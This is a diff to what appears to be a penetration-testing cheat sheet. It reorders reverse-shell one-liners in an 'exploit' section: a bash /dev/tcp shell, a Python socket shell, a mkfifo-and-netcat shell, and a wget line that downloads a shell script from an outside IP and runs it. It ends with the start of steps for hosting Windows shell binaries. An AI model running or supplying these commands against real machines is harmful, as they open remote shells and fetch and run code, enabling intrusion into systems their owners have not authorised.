@@ -210,16 +210,16 @@ exploit
 ```Bash
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
+```py
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Your_ip>",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
+```
+### If you have commands to enter then use the below scripts
 ```bash
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <Your_ip> 1234 > /tmp/f
 ```
 ```
 wget 10.8.1.72/shell.sh && bash shell.sh
 ```
-```py
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Your_ip>",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
-```
-
 __Download the reverse shell in windows__
   - > __First we need to host the file in your kali linux__
     - __`cd /usr/share/windows-binaries/`__
